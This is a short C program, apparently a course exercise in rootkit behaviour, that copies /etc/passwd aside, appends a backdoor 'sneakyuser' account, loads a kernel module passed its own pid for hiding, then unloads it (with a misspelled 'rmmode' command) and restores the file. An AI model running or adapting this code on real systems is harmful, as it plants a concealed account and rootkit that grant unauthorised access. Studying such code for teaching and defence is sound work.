#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

int main(int argc, char * argv[]){
    // 1st, print the pid
    printf("sneaky_process pid = %d\n", getpid());
    
    //2nd, print a new line to the end of the corresponding file.
    system("cp /etc/passwd /tmp/passwd");
    //
    system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");

    //3rd, load the sneaky module

    char argvSneaky[100];
    sprintf(argvSneaky, "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
    system(argvSneaky);

    //4th, reading loop

    char input;
    while((input = getchar()) != 'q'){
    }
    // 5th unload the module

    system("rmmode sneaky_mod.ko");

    //6th restore the /etc/passwd file
    system("cp /tmp/passwd /etc/passwd");

}